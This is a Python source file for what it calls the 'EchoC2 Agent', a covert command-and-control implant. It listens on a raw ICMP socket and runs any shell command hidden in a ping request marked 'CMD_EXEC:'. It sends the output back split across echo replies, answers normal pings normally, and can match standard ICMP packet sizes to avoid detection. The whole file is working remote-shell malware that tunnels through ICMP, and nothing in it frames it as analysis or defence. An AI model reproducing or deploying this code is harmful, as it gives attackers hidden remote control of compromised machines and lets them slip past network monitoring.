import socket
import struct
import subprocess
import sys
import argparse

COMMAND_PREFIX = b"CMD_EXEC:"
RESPONSE_PREFIX = b"CMD_RESPONSE:"

def parse_arguments():
    parser = argparse.ArgumentParser(description='EchoC2 Agent')
    parser.add_argument('--size', type=int, default=1024,
                        help='Max packet size (default: 1024). Use 84 to mimic standard ICMP packet lengths.')
    args = parser.parse_args()
    return args.size

MAX_PACKET_SIZE = parse_arguments()

ICMP_HEADER_SIZE = 8
IP_HEADER_SIZE = 20
FRAGMENT_HEADER_SIZE = 4
PAYLOAD_SIZE = MAX_PACKET_SIZE - IP_HEADER_SIZE - ICMP_HEADER_SIZE
FRAGMENT_SIZE = PAYLOAD_SIZE - FRAGMENT_HEADER_SIZE - len(RESPONSE_PREFIX)

def log(message):
    print(f"[*] {message}", file=sys.stderr, flush=True)

def calculate_checksum(packet):
    if len(packet) % 2 != 0:
        packet += b'\0'
    words = struct.unpack("!%sH" % (len(packet) // 2), packet)
    return (~sum(words) & 0xffff)

def create_icmp_socket():
    try:
        return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        log("Error: This script requires root privileges. Please run with sudo.")
        sys.exit(1)

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output
    except subprocess.CalledProcessError as e:
        return e.output

def server():
    log("Starting server with packet length " + str(MAX_PACKET_SIZE))
    icmp_socket = create_icmp_socket()
    icmp_socket.bind(("0.0.0.0", 0))
    
    while True:
        try:
            packet, addr = icmp_socket.recvfrom(MAX_PACKET_SIZE)
            icmp_type, code, checksum, p_id, sequence = struct.unpack('!BBHHH', packet[20:28])
            icmp_data = packet[28:]
            
            if icmp_type == 8: 
                if icmp_data.startswith(COMMAND_PREFIX):
                    command = icmp_data[len(COMMAND_PREFIX):].decode().strip()
                    log(f"Executing command: {command}")
                    output = execute_command(command)
                    
                    fragments = [output[i:i+FRAGMENT_SIZE] for i in range(0, len(output), FRAGMENT_SIZE)]
                    total_fragments = len(fragments)
                    
                    for i, fragment in enumerate(fragments):
                        fragment_header = struct.pack("!HH", i, total_fragments)
                        payload = fragment_header + RESPONSE_PREFIX + fragment
                        padding = b'\0' * (PAYLOAD_SIZE - len(payload))
                        padded_payload = payload + padding
                        
                        reply_header = struct.pack("!BBHHH", 0, 0, 0, p_id, sequence + i)
                        reply_checksum = calculate_checksum(reply_header + padded_payload)
                        reply_header = struct.pack("!BBHHH", 0, 0, reply_checksum, p_id, sequence + i)
                        reply_packet = reply_header + padded_payload
                        
                        log(f"Sending fragment {i+1}/{total_fragments}. Packet size: {len(reply_packet)}")
                        icmp_socket.sendto(reply_packet, addr)
                else:
                    reply_data = icmp_data[:PAYLOAD_SIZE].ljust(PAYLOAD_SIZE, b'\0')
                    reply_header = struct.pack("!BBHHH", 0, 0, 0, p_id, sequence)
                    reply_checksum = calculate_checksum(reply_header + reply_data)
                    reply_header = struct.pack("!BBHHH", 0, 0, reply_checksum, p_id, sequence)
                    reply_packet = reply_header + reply_data
                    icmp_socket.sendto(reply_packet, addr)
            else:
                log(f"Ignoring non-Echo Request ICMP packet. Type: {icmp_type}")
        except Exception as e:
            log(f"Error in server loop: {e}")

if __name__ == "__main__":
    server()